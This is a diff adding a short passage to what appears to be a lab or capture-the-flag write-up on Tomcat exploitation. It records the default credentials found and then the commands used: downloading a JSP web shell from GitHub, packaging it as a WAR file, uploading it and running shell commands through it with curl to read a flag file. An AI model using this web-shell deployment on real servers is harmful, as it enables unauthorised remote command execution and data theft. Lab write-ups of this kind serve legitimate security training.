@@ -148,3 +148,13 @@ Then execute by clicking on `/backup`
 
 # Exercise 2
 Using the MSFconsole was able to get the credentials of `tomcat:root`
+Then accessing the account did
+```bash
+wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+zip -r backup.war cmd.jsp
+# Uploaded it then
+http://web01.inlanefreight.local:8180/new/cmd.jsp?cmd=ls
+curl -s "http://web01.inlanefreight.local:8180/new/cmd.jsp?cmd=cat+/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt"
+
+
+```
